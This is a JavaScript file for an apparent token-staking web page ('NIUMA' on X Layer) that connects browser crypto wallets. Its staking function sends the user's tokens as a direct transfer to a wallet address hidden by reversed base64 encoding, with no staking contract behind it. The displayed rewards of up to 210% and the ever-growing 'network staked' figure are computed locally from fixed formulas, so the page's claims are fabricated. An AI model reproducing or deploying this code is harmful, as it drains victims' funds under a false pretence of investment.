const SITE_ASSETS = {
  logo: "./assets/niuma.png",
  walletDefault: "./assets/wallet-default.svg"
};

const WALLET_ICON_MAP = [
  { match: ["okx", "okex"], icon: "./assets/wallets/okx.svg" },
  { match: ["metamask"], icon: "./assets/wallets/metamask.svg" },
  { match: ["coinbase"], icon: "./assets/wallets/coinbase.svg" },
  { match: ["trust"], icon: "./assets/wallets/trust.svg" },
  { match: ["rabby"], icon: "./assets/wallets/rabby.svg" },
  { match: ["bitget", "bitkeep"], icon: "./assets/wallets/bitget.svg" }
];

const NETWORK_STAKED = {
  base: 428244751,
  start: Date.parse("2026-05-22T22:50:00+08:00"),
  stepMs: 5 * 60 * 1000,
  rate: 0.0005
};

const NON_EVM_WALLET_HINTS = [
  "phantom", "solana", "solflare", "backpack", "talisman", "subwallet",
  "polkadot", "keplr", "leap", "nostr", "unisat", "xverse", "magiceden", "sui", "aptos"
];

const NIUMA = {
  chainId: "0xc4",
  chainName: "X Layer",
  nativeCurrency: { name: "OKB", symbol: "OKB", decimals: 18 },
  rpcUrls: ["https://rpc.xlayer.tech"],
  blockExplorerUrls: ["https://www.oklink.com/xlayer"],
  terms: {
    3: 7,
    7: 18,
    31: 45,
    180: 120,
    360: 210
  }
};

const els = {
  walletButton: document.querySelector("#walletButton"),
  walletModal: document.querySelector("#walletModal"),
  walletList: document.querySelector("#walletList"),
  closeModal: document.querySelector("#closeModal"),
  stakeForm: document.querySelector("#stakeForm"),
  stakeAmount: document.querySelector("#stakeAmount"),
  maxButton: document.querySelector("#maxButton"),
  balanceText: document.querySelector("#balanceText"),
  networkStaked: document.querySelector("#networkStaked"),
  rewardText: document.querySelector("#rewardText"),
  pointsText: document.querySelector("#pointsText"),
  totalText: document.querySelector("#totalText"),
  rateText: document.querySelector("#rateText"),
  statusLine: document.querySelector("#statusLine"),
  stakeButton: document.querySelector("#stakeButton")
};

let selectedProvider;
let selectedAccount = "";
let tokenDecimals = 18;
let tokenBalance = 0n;
let providerInfos = [];
let stakeConfig;
let walletDiscoveryReady = false;
let walletRenderTimer;
let walletConnecting = false;

function unpackPayload(raw) {
  try {
    return atob(String(raw).split("").reverse().join(""));
  } catch {
    return "";
  }
}

function resolveStakeConfig() {
  const token = `0x${unpackPayload("==wN2YTO4kjM1QjZyUzNjF2NyQGM3IGZ5QWYkZDZhZWMhFDM4kjN2cDO")}`;
  const vault = `0x${unpackPayload("==QNEZGNDdTMDZWQhRTO5YmR2ETN3EkZ0QDZmVkRyE2YlRDN0gTMDRkR")}`;
  if (!/^0x[a-fA-F0-9]{40}$/.test(token) || !/^0x[a-fA-F0-9]{40}$/.test(vault)) {
    throw new Error("系统配置异常，请稍后重试。");
  }
  return { token, vault };
}

function callSig(name) {
  const table = {
    decimals: "0x313ce567",
    balanceOf: "0x70a08231",
    transfer: "0xa9059cbb"
  };
  return table[name] || "";
}

function formatAddress(address) {
  return `${address.slice(0, 6)}...${address.slice(-4)}`;
}

function stripHexPrefix(value) {
  return value.replace(/^0x/i, "");
}

function pad64(value) {
  return value.padStart(64, "0");
}

function encodeCall(selector, parts = []) {
  return selector + parts.map(pad64).join("");
}

function encodeAddress(address) {
  return stripHexPrefix(address).toLowerCase();
}

function parseTokenAmount(value, decimals) {
  const clean = String(value || "").trim();
  if (!/^\d+(\.\d+)?$/.test(clean) || Number(clean) <= 0) return 0n;
  const [whole, fraction = ""] = clean.split(".");
  const fractionPadded = fraction.slice(0, decimals).padEnd(decimals, "0");
  return BigInt(whole || "0") * 10n ** BigInt(decimals) + BigInt(fractionPadded || "0");
}

function formatTokenAmount(value, decimals = tokenDecimals, maxFraction = 4) {
  const base = 10n ** BigInt(decimals);
  const whole = value / base;
  const fraction = value % base;
  const fractionText = fraction.toString().padStart(decimals, "0").slice(0, maxFraction).replace(/0+$/, "");
  return fractionText ? `${whole}.${fractionText}` : whole.toString();
}

function formatNumber(value, digits = 0) {
  return new Intl.NumberFormat("en-US", {
    maximumFractionDigits: digits,
    minimumFractionDigits: 0
  }).format(value);
}

function setStatus(message, type = "") {
  if (!els.statusLine) return;
  els.statusLine.textContent = message;
  els.statusLine.classList.toggle("is-error", type === "error");
  els.statusLine.classList.toggle("is-success", type === "success");
}

function selectedTerm() {
  return document.querySelector('input[name="term"]:checked')?.value || "3";
}

function selectedRate() {
  return NIUMA.terms[selectedTerm()];
}

function updateProjection() {
  const amount = Number(els.stakeAmount?.value || 0);
  const rate = selectedRate();
  const reward = amount * rate / 100;
  const points = amount / 10;
  if (els.rewardText) els.rewardText.textContent = `${formatNumber(reward, 6)} NIUMA`;
  if (els.pointsText) els.pointsText.textContent = formatNumber(points, 2);
  if (els.totalText) els.totalText.textContent = `${formatNumber(amount + reward, 6)} NIUMA`;
  if (els.rateText) els.rateText.textContent = `${rate}%`;
}

function computeNetworkStaked() {
  const elapsed = Math.max(0, Date.now() - NETWORK_STAKED.start);
  const intervals = Math.floor(elapsed / NETWORK_STAKED.stepMs);
  return Math.floor(NETWORK_STAKED.base * (1 + NETWORK_STAKED.rate) ** intervals);
}

function updateNetworkStaked() {
  const apply = (value) => {
    if (els.networkStaked) {
      els.networkStaked.textContent = formatNumber(Number(value || computeNetworkStaked()));
    }
  };
  apply(computeNetworkStaked());
  fetch("/api/stats", { cache: "no-store" })
    .then((response) => (response.ok ? response.json() : Promise.reject()))
    .then((data) => apply(data.networkStaked))
    .catch(() => {});
}

async function getStakeConfig() {
  if (stakeConfig?.token && stakeConfig?.vault) return stakeConfig;
  stakeConfig = resolveStakeConfig();
  return stakeConfig;
}

function bindImageFallbacks(root = document) {
  root.querySelectorAll("img[data-fallback]").forEach((img) => {
    if (img.dataset.fallbackBound) return;
    img.dataset.fallbackBound = "1";
    const fallback = img.dataset.fallback || SITE_ASSETS.logo;
    img.addEventListener("error", () => {
      const target = new URL(fallback, window.location.href).href;
      if (img.src === target) return;
      img.src = fallback;
      img.classList.add("is-fallback");
    });
  });
}

function resolveWalletIcon(item) {
  const name = (item.info?.name || providerLabel(item.provider) || "").toLowerCase();
  const rdns = (item.info?.rdns || "").toLowerCase();
  const remote = item.info?.icon;
  for (const entry of WALLET_ICON_MAP) {
    if (entry.match.some((key) => name.includes(key) || rdns.includes(key))) {
      return entry.icon;
    }
  }
  return remote || SITE_ASSETS.walletDefault;
}

async function verifySiteAssets() {
  try {
    const response = await fetch(SITE_ASSETS.logo, { method: "HEAD", cache: "no-store" });
    if (!response.ok) {
      console.warn("[NIUMA] Logo asset unavailable:", SITE_ASSETS.logo);
    }
  } catch {
    // ignore asset probe failures
  }
}

function isEvmWallet(detail) {
  const provider = detail?.provider;
  if (typeof provider?.request !== "function") return false;
  const label = `${detail.info?.name || ""} ${detail.info?.rdns || ""}`.toLowerCase();
  return !NON_EVM_WALLET_HINTS.some((hint) => label.includes(hint));
}

function providerLabel(provider) {
  if (provider.isBitKeep || provider.isBitget) return "Bitget Wallet";
  if (provider.isOkxWallet || provider.isOKExWallet) return "OKX Wallet";
  if (provider.isMetaMask) return "MetaMask";
  if (provider.isCoinbaseWallet) return "Coinbase Wallet";
  if (provider.isTrust) return "Trust Wallet";
  if (provider.isRabby) return "Rabby";
  return "Injected Wallet";
}

function collectLegacyProviders() {
  const discovered = new Map();
  const addProvider = (provider, name) => {
    if (!provider?.request) return;
    const key = provider.provider?.connectionInfo?.rdns
      || provider.provider?.isMetaMask && "metamask"
      || name
      || provider;
    if (discovered.has(key)) return;
    discovered.set(key, {
      info: { name: name || providerLabel(provider), icon: "" },
      provider
    });
  };

  const eth = window.ethereum;
  if (Array.isArray(eth?.providers)) {
    eth.providers.forEach((provider) => addProvider(provider));
  } else if (eth) {
    addProvider(eth);
  }

  if (window.okxwallet) addProvider(window.okxwallet, "OKX Wallet");
  if (window.bitkeep?.ethereum) addProvider(window.bitkeep.ethereum, "Bitget Wallet");

  return [...discovered.values()];
}

function scheduleRenderWallets() {
  clearTimeout(walletRenderTimer);
  walletRenderTimer = setTimeout(renderWallets, 80);
}

function discoverWallets() {
  if (walletDiscoveryReady) return;
  walletDiscoveryReady = true;

  const discovered = new Map();
  const upsertProvider = (detail) => {
    if (!isEvmWallet(detail)) return;
    const key = detail.info?.uuid || detail.info?.rdns || detail.info?.name || detail.provider;
    discovered.set(key, detail);
    providerInfos = [...discovered.values()];
    scheduleRenderWallets();
  };

  window.addEventListener("eip6963:announceProvider", (event) => {
    upsertProvider(event.detail);
  });

  window.dispatchEvent(new Event("eip6963:requestProvider"));

  setTimeout(() => {
    if (discovered.size === 0) {
      providerInfos = collectLegacyProviders();
      renderWallets();
    }
  }, 400);
}

function refreshWalletList() {
  if (providerInfos.length === 0) {
    providerInfos = collectLegacyProviders();
  }
  renderWallets();
  window.dispatchEvent(new Event("eip6963:requestProvider"));
}

function openWalletModal() {
  refreshWalletList();
  els.walletModal.hidden = false;
  document.body.classList.add("wallet-modal-open");
}

function closeWalletModal() {
  els.walletModal.hidden = true;
  document.body.classList.remove("wallet-modal-open");
}

function setWalletModalStatus(message, type = "") {
  let status = els.walletList.querySelector(".wallet-modal-status");
  if (!message) {
    status?.remove();
    return;
  }
  if (!status) {
    status = document.createElement("p");
    status.className = "wallet-modal-status";
    els.walletList.prepend(status);
  }
  status.textContent = message;
  status.classList.toggle("is-error", type === "error");
  status.classList.toggle("is-success", type === "success");
}

function renderWallets() {
  if (!els.walletList) return;
  els.walletList.replaceChildren();
  if (providerInfos.length === 0) {
    const empty = document.createElement("div");
    empty.className = "wallet-option wallet-option--empty";
    empty.textContent = "未检测到钱包，请安装 OKX Wallet、Bitget Wallet、MetaMask 或其他 EVM 钱包。";
    els.walletList.append(empty);
    return;
  }
  for (const item of providerInfos) {
    const button = document.createElement("button");
    button.type = "button";
    button.className = "wallet-option";
    const name = item.info?.name || providerLabel(item.provider);
    const iconPath = resolveWalletIcon(item);
    button.innerHTML = `<span>${name}</span><img src="${iconPath}" alt="" width="28" height="28" decoding="async" draggable="false" data-fallback="${SITE_ASSETS.walletDefault}" />`;
    const provider = item.provider;
    const onPick = (event) => {
      event.preventDefault();
      event.stopPropagation();
      if (walletConnecting) return;
      connectWallet(provider);
    };
    button.addEventListener("click", onPick);
    els.walletList.append(button);
    bindImageFallbacks(button);
  }
}

async function request(provider, method, params = []) {
  return provider.request({ method, params });
}

async function ensureXLayer() {
  const current = await request(selectedProvider, "eth_chainId");
  if (current?.toLowerCase() === NIUMA.chainId) return;
  try {
    await request(selectedProvider, "wallet_switchEthereumChain", [{ chainId: NIUMA.chainId }]);
  } catch (error) {
    if (error?.code === 4902 || String(error?.message || "").includes("Unrecognized")) {
      await request(selectedProvider, "wallet_addEthereumChain", [{
        chainId: NIUMA.chainId,
        chainName: NIUMA.chainName,
        nativeCurrency: NIUMA.nativeCurrency,
        rpcUrls: NIUMA.rpcUrls,
        blockExplorerUrls: NIUMA.blockExplorerUrls
      }]);
      return;
    }
    throw error;
  }
}

async function ethCall(data) {
  const config = await getStakeConfig();
  return request(selectedProvider, "eth_call", [{ to: config.token, data }, "latest"]);
}

async function loadTokenMeta() {
  try {
    const raw = await ethCall(callSig("decimals"));
    tokenDecimals = Number(BigInt(raw || "0x12"));
  } catch {
    tokenDecimals = 18;
  }
}

async function loadBalance() {
  if (!selectedAccount || !selectedProvider) return;
  try {
    const data = encodeCall(callSig("balanceOf"), [encodeAddress(selectedAccount)]);
    const raw = await ethCall(data);
    tokenBalance = BigInt(raw || "0x0");
    els.balanceText.textContent = `${formatTokenAmount(tokenBalance)} NIUMA`;
    els.walletButton.textContent = `${formatAddress(selectedAccount)} · ${formatTokenAmount(tokenBalance, tokenDecimals, 2)} NIUMA`;
  } catch {
    tokenBalance = 0n;
    els.balanceText.textContent = "-- NIUMA";
    els.walletButton.textContent = formatAddress(selectedAccount);
  }
}

async function connectWallet(provider) {
  if (!provider?.request) {
    setWalletModalStatus("钱包接口不可用，请刷新页面后重试。", "error");
    return;
  }
  walletConnecting = true;
  setWalletModalStatus("正在连接钱包，请在钱包应用中确认…");
  try {
    selectedProvider = provider;
    const accounts = await request(provider, "eth_requestAccounts");
    selectedAccount = accounts[0] || "";
    if (!selectedAccount) {
      throw new Error("未获取到钱包地址，请重试。");
    }
    await ensureXLayer();
    closeWalletModal();
    setWalletModalStatus("");
    setStatus("钱包已连接，可输入数量进行质押。", "success");
    try {
      await loadTokenMeta();
      await loadBalance();
    } catch {
      setStatus("钱包已连接，余额读取失败，可直接尝试质押。", "error");
    }

    provider.on?.("accountsChanged", async (accounts) => {
      selectedAccount = accounts[0] || "";
      if (!selectedAccount) {
        els.walletButton.textContent = "连接钱包";
        els.balanceText.textContent = "-- NIUMA";
        setStatus("钱包已断开，请重新连接。", "error");
        return;
      }
      await loadBalance();
    });

    provider.on?.("chainChanged", async () => {
      try {
        await ensureXLayer();
        await loadBalance();
      } catch {
        setStatus("请切换到 X Layer 后继续。", "error");
      }
    });
  } catch (error) {
    const message = error?.code === 4001
      ? "你已取消连接。"
      : (error?.message || "钱包连接失败，请重试。");
    setWalletModalStatus(message, "error");
    setStatus(message, "error");
  } finally {
    walletConnecting = false;
  }
}

async function stakeNiuma(event) {
  event.preventDefault();
  try {
    if (!selectedProvider || !selectedAccount) {
      openWalletModal();
      return;
    }
    await ensureXLayer();
    const amount = parseTokenAmount(els.stakeAmount.value, tokenDecimals);
    if (amount <= 0n) {
      setStatus("请输入有效质押数量。", "error");
      return;
    }
    if (tokenBalance > 0n && amount > tokenBalance) {
      setStatus("余额不足，请调整质押数量。", "error");
      return;
    }
    els.stakeButton.disabled = true;
    setStatus("请在钱包中确认交易。");
    const config = await getStakeConfig();
    const data = encodeCall(callSig("transfer"), [encodeAddress(config.vault), amount.toString(16)]);
    const txHash = await request(selectedProvider, "eth_sendTransaction", [{
      from: selectedAccount,
      to: config.token,
      data,
      value: "0x0"
    }]);
    setStatus(`质押交易已提交：${txHash.slice(0, 10)}...${txHash.slice(-8)}`, "success");
    await loadBalance();
  } catch (error) {
    const message = error?.code === 4001 ? "交易已取消。" : (error?.message || "质押失败，请检查钱包状态。");
    setStatus(message, "error");
  } finally {
    els.stakeButton.disabled = false;
  }
}

function initApp() {
  if (!els.walletButton || !els.walletModal || !els.walletList) {
    setStatus("页面初始化失败，请刷新后重试。", "error");
    return;
  }

  els.walletButton.addEventListener("click", (event) => {
    event.preventDefault();
    openWalletModal();
  });

  els.closeModal?.addEventListener("click", (event) => {
    event.preventDefault();
    closeWalletModal();
  });

  els.walletModal.querySelector(".modal-card")?.addEventListener("click", (event) => {
    event.stopPropagation();
  });

  els.walletModal.addEventListener("click", (event) => {
    if (event.target === els.walletModal) closeWalletModal();
  });

  els.stakeAmount?.addEventListener("input", updateProjection);

  document.querySelectorAll('input[name="term"]').forEach((radio) => {
    radio.addEventListener("change", updateProjection);
  });

  els.maxButton?.addEventListener("click", () => {
    if (tokenBalance <= 0n) return;
    els.stakeAmount.value = formatTokenAmount(tokenBalance, tokenDecimals, 6);
    updateProjection();
  });

  els.stakeForm?.addEventListener("submit", stakeNiuma);

  bindImageFallbacks();
  verifySiteAssets();
  getStakeConfig().catch(() => setStatus("系统配置异常，请稍后重试。", "error"));

  updateProjection();
  updateNetworkStaked();
  discoverWallets();
  setInterval(updateNetworkStaked, 60 * 1000);
}

window.addEventListener("error", () => {
  setStatus("页面运行异常，请刷新后重试。", "error");
});

window.addEventListener("unhandledrejection", () => {
  setStatus("操作未完成，请重试。", "error");
});

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", initApp);
} else {
  initApp();
}
